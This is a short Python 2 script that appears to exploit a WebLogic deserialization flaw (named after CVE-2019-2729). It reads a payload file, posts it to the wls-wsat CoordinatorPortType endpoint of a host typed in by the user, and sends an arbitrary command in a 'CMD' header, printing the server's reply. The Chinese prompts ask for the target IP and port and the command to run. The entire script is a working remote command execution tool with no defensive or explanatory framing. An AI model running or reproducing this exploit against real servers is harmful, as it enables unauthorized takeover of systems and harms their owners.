# coding=utf-8
# @Author: wangjunhu && mingliang
# @Date:   2019年8月19日
import requests
import sys
import io


file = io.open('./Weblogic-2729.txt', 'r', encoding='utf-8')
payloads = file.read()


def exp(host, cmd, payload):
    try:
        payload = payload
        url = 'http://' + host + '/wls-wsat/CoordinatorPortType'
        Headers = {'Content-Type': 'text/xml', 'SOAPAction': '\"\"', 'Content-Length': '175816',
                   'User-Agent': 'Apache-HttpClient/4.1.1 (java 1.5)', 'Connection': 'close', }

        Headers['Host'] = host
        Headers['CMD'] = cmd
        req = requests.post(url, data=payload, headers=Headers)
        print req.text
    except Exception as e:
        raise e


if __name__ == '__main__':
    host = raw_input('请输入测试主机IP:Port->')
    cmd = raw_input('请输入执行的命令->')
    payload = payloads
    try:
        exp(host, cmd, payload)
    except Exception as e:
        raise e
